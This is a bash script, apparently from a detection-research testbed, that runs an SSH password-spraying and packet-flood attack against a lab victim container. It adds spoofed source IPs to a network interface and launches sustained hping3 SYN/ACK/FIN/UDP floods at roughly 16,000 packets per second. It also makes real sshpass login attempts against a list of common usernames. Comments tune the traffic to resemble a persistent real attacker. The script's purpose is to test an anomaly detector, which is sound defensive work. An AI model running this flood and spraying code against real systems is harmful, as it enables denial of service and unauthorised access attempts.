#!/bin/bash

set -euo pipefail

VICTIM_IP="${1:-victima}"
VICTIM_PORT="${2:-2222}"
CAMPAIGN_ID="${CAMPAIGN_ID:-${3:-}}"
LOG_DIR="${NOVADEF_LOG_DIR:-/var/novadef/logs}"
OUTPUT_FILE="${LOG_DIR}/password_spraying_attempts.jsonl"
STOP_SIGNAL_FILE="${LOG_DIR}/stop_network_attack.signal"
# Pausa entre rondas del bucle sostenido (tras la rampa inicial). 0.4s used to
# be deliberate ("oscillate the aggregate volume instead of a flat plateau"),
# but at the ~0.3-0.6s sampling cadence the traffic figures use, that gap was
# long enough for the inbound rate to fall all the way to near-zero between
# batches — a sawtooth, not the sustained-attacker plateau a persistent
# real-world attacker profile is supposed to show. Near-zero keeps the next
# batch launching essentially back-to-back so the aggregate rate stays high
# and continuous instead of visibly gapping.
SLEEP_SECONDS="${SLEEP_SECONDS:-0.02}"
CONNECT_TIMEOUT="${CONNECT_TIMEOUT:-1}"
COMMAND_TIMEOUT="${COMMAND_TIMEOUT:-0.25}"
PROBE_TIMEOUT="${PROBE_TIMEOUT:-1.0}"
ATTACK_DURATION_SECONDS="${ATTACK_DURATION_SECONDS:-600}"
SOURCE_BATCH_SIZE="${SOURCE_BATCH_SIZE:-16}"
ATTEMPTS_PER_PAIR="${ATTEMPTS_PER_PAIR:-3}"
# 300 paquetes por fuente por ronda con intervalo 1000us → ~1000 pkt/s por
# fuente, 16 fuentes en paralelo → pico de ~16.000 pkt/s agregados. Sigue
# siendo un salto de ~250-500x sobre el baseline benigno (30-60 pps) —
# trivialmente detectable por Isolation Forest sin necesidad de campaign_id —
# pero sin el pico de ~80.000 pkt/s que un HPING_INTERVAL_US=200 (~5000 pkt/s
# por fuente) producía: ese volumen saturaba la CPU de tshark (capturar y
# codificar a JSON es costoso por paquete) durante varios segundos, lo que en
# exp3 retrasaba a Filebeat recoger los eventos de Falco/ransomware
# posteriores, ajenos a este ataque, que quedaban justo detrás en el pipeline.
PROBE_BURST="${PROBE_BURST:-300}"
INITIAL_SURGE_PACKETS_PER_SOURCE="${INITIAL_SURGE_PACKETS_PER_SOURCE:-500}"
SOURCE_IP_START="${SOURCE_IP_START:-160}"
SOURCE_IP_END="${SOURCE_IP_END:-175}"
TARGET_USER_LIMIT="${TARGET_USER_LIMIT:-6}"
ATTEMPT_SLEEP_SECONDS="${ATTEMPT_SLEEP_SECONDS:-0.05}"
# 1000us (1ms) between hping3 packets → ~1000 pkt/s per source
HPING_INTERVAL_US="${HPING_INTERVAL_US:-1000}"
if ! [[ "${HPING_INTERVAL_US}" =~ ^[0-9]+$ ]] || [ "${HPING_INTERVAL_US}" -lt 100 ]; then
  HPING_INTERVAL_US=200
fi
# NOTA (realismo): el atacante NO publica nada a Kafka. En un ataque real el
# adversario nunca alimentaría la cola de mensajes del defensor. La detección
# es 100% por OBSERVACIÓN PASIVA: tshark captura los paquetes de red que este
# script genera (hping3 + intentos SSH reales) y CICFlowMeter deriva los flujos;
# el detector de anomalías (Isolation Forest) infiere el ataque de esa telemetría
# (volumen, tasa, distribución de IPs de origen, puerto objetivo). El fichero
# OUTPUT_FILE se mantiene solo como evidencia forense local del atacante.

mkdir -p "${LOG_DIR}"
rm -f "${OUTPUT_FILE}"
touch "${OUTPUT_FILE}"
# Clear any leftover stop signal from a PRIOR run — the API's startup sweep
# (_kill_network_attack_everywhere) touches this same file to stop a stray
# attack process on a reused scenario, but never removes it afterward. Without
# this, a fresh invocation of this script finds the signal already present
# and breaks out of its main loop on the very first check, before completing
# any round at all.
rm -f "${STOP_SIGNAL_FILE}"

stop_attack_children() {
  pkill -TERM -P $$ sshpass 2>/dev/null || true
  pkill -TERM -P $$ ssh 2>/dev/null || true
  pkill -TERM -P $$ hping3 2>/dev/null || true
  pkill -TERM hping3 2>/dev/null || true
  # Also tear down the persistent network-flood workers (defined later); each
  # is a background subshell that re-launches hping3 in a loop, so killing the
  # hping3 processes alone would just let the loop spawn new ones. Guarded so
  # this is a no-op before the flood has been started.
  if declare -p FLOOD_PIDS >/dev/null 2>&1; then
    for fp in "${FLOOD_PIDS[@]}"; do
      kill "${fp}" 2>/dev/null || true
    done
  fi
}

# Removes the secondary source IPs added to the interface below (SOURCE_IPS /
# `ip addr add`). Without this, they never get cleaned up — the attacker
# container is reused across consecutive runs of the same scenario, so each
# run added its own batch on top of every prior run's, leaving dozens of
# stale secondary IPs permanently on the interface. Those stayed ARPable on
# launcher_default indefinitely, which is what kept tshark's baseline capture
# rate elevated (~290 pkt/s) even with no attack running.
cleanup_source_ips() {
  if [ -n "${iface:-}" ] && [ "${#SOURCE_IPS[@]:-0}" -gt 0 ]; then
    for src_ip in "${SOURCE_IPS[@]}"; do
      ip addr del "${src_ip}/16" dev "${iface}" 2>/dev/null || true
    done
  fi
}

watch_stop_signal() {
  while [ ! -f "${STOP_SIGNAL_FILE}" ]; do
    sleep 0.1
  done
  stop_attack_children
}

watch_stop_signal &
WATCHER_PID=$!
trap 'kill "${WATCHER_PID}" 2>/dev/null || true; stop_attack_children; cleanup_source_ips' EXIT

resolved_victim_ip="$(getent ahostsv4 "${VICTIM_IP}" | awk 'NR==1 {print $1}')"
if [ -n "${resolved_victim_ip}" ]; then
  VICTIM_TARGET="${resolved_victim_ip}"
else
  VICTIM_TARGET="${VICTIM_IP}"
fi

# Evidencia forense local del atacante (no se envía a ningún sistema del
# defensor). La detección la hace el defensor observando la red con tshark.
seed_ts="$(date +%s.%3N)"
printf '{"src_ip":"%s","dst_ip":"%s","dst_port":%s,"protocol":"tcp","username":"%s","auth_success":false,"attempt":%s,"timestamp":%s}\n' \
  "172.18.0.160" "${VICTIM_TARGET}" "${VICTIM_PORT}" "admin" "0" "${seed_ts}" >> "${OUTPUT_FILE}"

SOURCE_IPS=()
# Rango configurable para simular múltiples orígenes sin saturar la escena.
for last_octet in $(seq "${SOURCE_IP_START}" "${SOURCE_IP_END}"); do
  SOURCE_IPS+=("172.18.0.${last_octet}")
done

TARGET_USERS=(
  "admin"
  "root"
  "administrator"
  "backup"
  "monitoring"
  "support"
  "sales"
  "marketing"
  "finance"
  "developer"
  "devops"
  "jenkins"
  "user"
  "guest"
  "test"
  "auditor"
  "secops"
  "analyst"
  "backupsvc"
  "service"
  "svc-backup"
  "svc-monitor"
  "svc-ops"
  "svc-support"
  "svc-admin"
  "svc-web"
  "svc-db"
  "svc-api"
)
if [[ "${TARGET_USER_LIMIT}" =~ ^[0-9]+$ ]] && [ "${TARGET_USER_LIMIT}" -gt 0 ] && [ "${TARGET_USER_LIMIT}" -lt "${#TARGET_USERS[@]}" ]; then
  TARGET_USERS=("${TARGET_USERS[@]:0:${TARGET_USER_LIMIT}}")
fi
PROBE_MODES=("syn" "ack" "fin" "udp")

iface="$(ip route get "${VICTIM_TARGET}" | awk '/dev/ {for (i = 1; i <= NF; i++) if ($i == "dev") {print $(i+1); exit}}')"
if [ -z "${iface}" ]; then
  echo "No se pudo determinar la interfaz hacia ${VICTIM_TARGET}" >&2
  exit 1
fi

for src_ip in "${SOURCE_IPS[@]}"; do
  if ! ip addr show dev "${iface}" | grep -q "${src_ip}"; then
    ip addr add "${src_ip}/16" dev "${iface}" 2>/dev/null || true
  fi
done

# Rampa inicial ESCALONADA (no un único salto vertical): en vez de lanzar las
# 16 fuentes a la vez a máxima ráfaga (lo que se ve como una línea recta hacia
# arriba en la gráfica), se sube el volumen en 3 oleadas crecientes — pocas
# fuentes/pocos paquetes primero, más después — con una pequeña pausa entre
# cada una. El volumen total entregado es el mismo; el perfil temporal es una
# curva creciente en escalones en vez de un impulso instantáneo.
if [ "${INITIAL_SURGE_PACKETS_PER_SOURCE}" -gt 0 ]; then
  num_sources="${#SOURCE_IPS[@]}"
  # 3 oleadas: ~25%, ~55%, 100% de las fuentes; cada fuente manda una fracción
  # creciente de INITIAL_SURGE_PACKETS_PER_SOURCE en su oleada.
  wave_fracs_sources="25 55 100"
  wave_fracs_packets="30 60 100"
  prev_src_count=0
  wave_idx=0
  for wave_pct_pair in "25:30" "55:60" "100:100"; do
    src_pct="${wave_pct_pair%%:*}"
    pkt_pct="${wave_pct_pair##*:}"
    wave_src_count=$(( (num_sources * src_pct + 99) / 100 ))
    [ "${wave_src_count}" -gt "${num_sources}" ] && wave_src_count="${num_sources}"
    wave_pkts=$(( (INITIAL_SURGE_PACKETS_PER_SOURCE * pkt_pct + 99) / 100 ))
    [ "${wave_pkts}" -lt 1 ] && wave_pkts=1

    surge_pids=()
    surge_idx=0
    idx=0
    for src_ip in "${SOURCE_IPS[@]}"; do
      idx=$((idx + 1))
      if [ "${idx}" -gt "${wave_src_count}" ]; then
        break
      fi
      (
        timeout "${PROBE_TIMEOUT}" hping3 -q -i "u${HPING_INTERVAL_US}" -S -c "${wave_pkts}" -p "${VICTIM_PORT}" -a "${src_ip}" -M $((5000 + wave_idx * 1000 + surge_idx)) -d 24 "${VICTIM_TARGET}" >/dev/null 2>&1 || true
      ) &
      surge_pids+=("$!")
      surge_idx=$((surge_idx + 1))
      if [ "${#surge_pids[@]}" -ge "${SOURCE_BATCH_SIZE}" ]; then
        wait "${surge_pids[@]}" || true
        surge_pids=()
      fi
    done
    if [ "${#surge_pids[@]}" -gt 0 ]; then
      wait "${surge_pids[@]}" || true
    fi
    wave_idx=$((wave_idx + 1))
    # Pausa breve entre oleadas para que la gráfica muestre escalones
    # diferenciados en vez de una subida continua. 1.5s (x3 waves = 4.5s of
    # pauses alone) used to push the full surge past exp1's detect->act
    # window (~2.9s measured), so net_in barely moved before the
    # countermeasure landed and the attack's real volume only ever showed up
    # AFTER isolation, as blocked_packets — the traffic timeline never showed
    # the rise the countermeasure is supposed to be reacting to. 0.3s keeps
    # the same 3-step-ramp shape (still not an instant impulse) but completes
    # all 3 waves in ~1.5-2s, comfortably inside that window.
    sleep "${SURGE_WAVE_GAP_SECONDS:-0.3}"
  done
fi

# --- Continuous network flood (decoupled from the SSH forensic loop) ---------
# The sustained SSH loop below fires one hping3 burst PER source and then does
# 3 real (slow, timing-out) SSH attempts inside the same subshell before the
# per-batch `wait` returns. hping3 finishes its ~300-packet burst in a few
# hundred ms, but the subshell stays alive for the much slower SSH attempts, so
# the batch's `wait` gates the NEXT burst on the SSH — leaving a visible gap
# with no packets between bursts. On the traffic figure that reads as a
# sawtooth (rate spikes then collapses to ~0, over and over) instead of the
# sustained high-rate flood a real volumetric attack produces.
#
# Fix: run the packet flood in its OWN persistent background loop, one worker
# per source IP, each re-launching hping3 back-to-back with no gap. This keeps
# the inbound packet RATE high and continuous for the whole attack, fully
# independent of the SSH forensic cadence. The SSH loop below is untouched and
# still provides the real auth-attempt evidence; it just no longer drives the
# network-rate curve. Honors the same stop signal / duration bound as the SSH
# loop so it tears down cleanly.
FLOOD_PIDS=()
if [ "${NETWORK_FLOOD_ENABLED:-1}" = "1" ]; then
  flood_start_epoch="$(date +%s)"
  flood_seed=0
  for flood_src in "${SOURCE_IPS[@]}"; do
    flood_mode="${PROBE_MODES[$((flood_seed % ${#PROBE_MODES[@]}))]}"
    (
      while :; do
        [ -f "${STOP_SIGNAL_FILE}" ] && exit 0
        now_epoch="$(date +%s)"
        if [ "${ATTACK_DURATION_SECONDS}" -gt 0 ] && [ "$((now_epoch - flood_start_epoch))" -ge "${ATTACK_DURATION_SECONDS}" ]; then
          exit 0
        fi
        case "${flood_mode}" in
          syn) hping3 -q -i "u${HPING_INTERVAL_US}" -S -c "${PROBE_BURST}" -p "${VICTIM_PORT}" -a "${flood_src}" -M $((1000 + flood_seed)) -d 24 "${VICTIM_TARGET}" >/dev/null 2>&1 || true ;;
          ack) hping3 -q -i "u${HPING_INTERVAL_US}" -A -c "${PROBE_BURST}" -p "${VICTIM_PORT}" -a "${flood_src}" -M $((2000 + flood_seed)) -d 24 "${VICTIM_TARGET}" >/dev/null 2>&1 || true ;;
          fin) hping3 -q -i "u${HPING_INTERVAL_US}" -F -c "${PROBE_BURST}" -p "${VICTIM_PORT}" -a "${flood_src}" -M $((3000 + flood_seed)) -d 24 "${VICTIM_TARGET}" >/dev/null 2>&1 || true ;;
          udp) hping3 -q -i "u${HPING_INTERVAL_US}" -2 -c "${PROBE_BURST}" -p "${VICTIM_PORT}" -a "${flood_src}" -d 24 "${VICTIM_TARGET}" >/dev/null 2>&1 || true ;;
        esac
      done
    ) &
    FLOOD_PIDS+=("$!")
    flood_seed=$((flood_seed + 1))
  done
fi

start_epoch="$(date +%s)"
round_count=0
while :; do
  if [ -f "${STOP_SIGNAL_FILE}" ]; then
    break
  fi
  now_epoch="$(date +%s)"
  elapsed="$((now_epoch - start_epoch))"
  if [ "${ATTACK_DURATION_SECONDS}" -gt 0 ] && [ "${elapsed}" -ge "${ATTACK_DURATION_SECONDS}" ]; then
    break
  fi
  round_count=$((round_count + 1))
  for target_user in "${TARGET_USERS[@]}"; do
    pids=()
    src_idx=0
    for src_ip in "${SOURCE_IPS[@]}"; do
      if [ -f "${STOP_SIGNAL_FILE}" ]; then
        stop_attack_children
        break 2
      fi
      now_epoch="$(date +%s)"
      elapsed="$((now_epoch - start_epoch))"
      if [ "${ATTACK_DURATION_SECONDS}" -gt 0 ] && [ "${elapsed}" -ge "${ATTACK_DURATION_SECONDS}" ]; then
        stop_attack_children
        break 2
      fi

      (
        if [ -f "${STOP_SIGNAL_FILE}" ]; then
          stop_attack_children
          exit 0
        fi
        probe_seed=$((round_count + src_idx))
        probe_mode="${PROBE_MODES[$((probe_seed % ${#PROBE_MODES[@]}))]}"
        case "${probe_mode}" in
          syn)
            timeout "${PROBE_TIMEOUT}" hping3 -q -i "u${HPING_INTERVAL_US}" -S -c "${PROBE_BURST}" -p "${VICTIM_PORT}" -a "${src_ip}" -M $((1000 + probe_seed)) -d $((16 + (probe_seed % 4) * 8)) "${VICTIM_TARGET}" >/dev/null 2>&1 || true
            ;;
          ack)
            timeout "${PROBE_TIMEOUT}" hping3 -q -i "u${HPING_INTERVAL_US}" -A -c "${PROBE_BURST}" -p "${VICTIM_PORT}" -a "${src_ip}" -M $((2000 + probe_seed)) -d $((24 + (probe_seed % 3) * 8)) "${VICTIM_TARGET}" >/dev/null 2>&1 || true
            ;;
          fin)
            timeout "${PROBE_TIMEOUT}" hping3 -q -i "u${HPING_INTERVAL_US}" -F -c "${PROBE_BURST}" -p "${VICTIM_PORT}" -a "${src_ip}" -M $((3000 + probe_seed)) -d $((32 + (probe_seed % 5) * 4)) "${VICTIM_TARGET}" >/dev/null 2>&1 || true
            ;;
          udp)
            timeout "${PROBE_TIMEOUT}" hping3 -q -i "u${HPING_INTERVAL_US}" -2 -c "${PROBE_BURST}" -p "${VICTIM_PORT}" -a "${src_ip}" -d $((20 + (probe_seed % 4) * 6)) "${VICTIM_TARGET}" >/dev/null 2>&1 || true
            ;;
        esac
        attempt=0
        while [ "${attempt}" -lt "${ATTEMPTS_PER_PAIR}" ]; do
          if [ -f "${STOP_SIGNAL_FILE}" ]; then
            stop_attack_children
            exit 0
          fi
          attempt=$((attempt + 1))
          attempt_ts="$(date +%s.%3N)"
          timeout "${COMMAND_TIMEOUT}" sshpass -p "WrongPassword!123" ssh \
            -o PreferredAuthentications=password \
            -o PubkeyAuthentication=no \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -o ConnectTimeout="${CONNECT_TIMEOUT}" \
            -o ConnectionAttempts=1 \
            -p "${VICTIM_PORT}" \
            -b "${src_ip}" \
            "${target_user}@${VICTIM_TARGET}" "true" >/dev/null 2>&1 || true
          # El intento SSH real anterior genera paquetes de red que tshark observa.
          # Solo registramos evidencia forense local; el detector NO recibe nada
          # del atacante: infiere el ataque por anomalía sobre la telemetría de red.
          printf '{"src_ip":"%s","dst_ip":"%s","dst_port":%s,"protocol":"tcp","username":"%s","auth_success":false,"attempt":%s,"timestamp":%s}\n' \
            "${src_ip}" "${VICTIM_TARGET}" "${VICTIM_PORT}" "${target_user}" "${attempt}" "${attempt_ts}" >> "${OUTPUT_FILE}"
          sleep "${ATTEMPT_SLEEP_SECONDS}"
        done
      ) &
      pids+=("$!")
      src_idx=$((src_idx + 1))
    done
    if [ "${#pids[@]}" -gt 0 ]; then
      wait "${pids[@]}" || true
    fi
    if [ -f "${STOP_SIGNAL_FILE}" ]; then
      stop_attack_children
      break 2
    fi
    sleep "${SLEEP_SECONDS}"
  done
done

# Ensure the persistent flood workers are stopped when the sustained loop ends
# by duration bound (the trap on EXIT also covers this, but tear them down
# promptly here rather than waiting for script teardown).
stop_attack_children

echo "Password spraying completado tras ${round_count} rondas. Evidencia: ${OUTPUT_FILE}"
